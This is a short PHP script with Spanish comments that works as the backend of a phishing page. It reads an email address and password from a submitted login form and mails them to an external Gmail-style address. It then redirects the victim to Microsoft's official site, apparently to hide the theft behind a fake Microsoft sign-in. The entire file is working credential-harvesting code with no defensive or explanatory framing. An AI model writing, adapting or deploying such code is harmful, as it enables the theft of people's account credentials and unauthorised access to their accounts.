<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibe los datos del formulario
    $correo = $_POST['correo'];
    $contrasena = $_POST['contrasena'];

    // Correo de destino
    $destinatario = "cucapremium01@gmail.com.com";

    // Asunto del correo
    $asunto = "Credenciales de inicio de sesión";

    // Contenido del correo
    $mensaje = "Se han ingresado las siguientes credenciales:\n";
    $mensaje .= "Correo electrónico: " . $correo . "\n";
    $mensaje .= "Contraseña: " . $contrasena;

    // Cabeceras del correo
    $cabeceras = "From: " . $correo;

    // Envía el correo
    mail($destinatario, $asunto, $mensaje, $cabeceras);

    // Redirecciona a la página oficial de Microsoft
    header("Location: https://www.microsoft.com/");
    exit;
} else {
    // Redirecciona a una página de error si se accede directamente al archivo PHP
    header("Location: pagina_de_error.php");
    exit;
}
?>
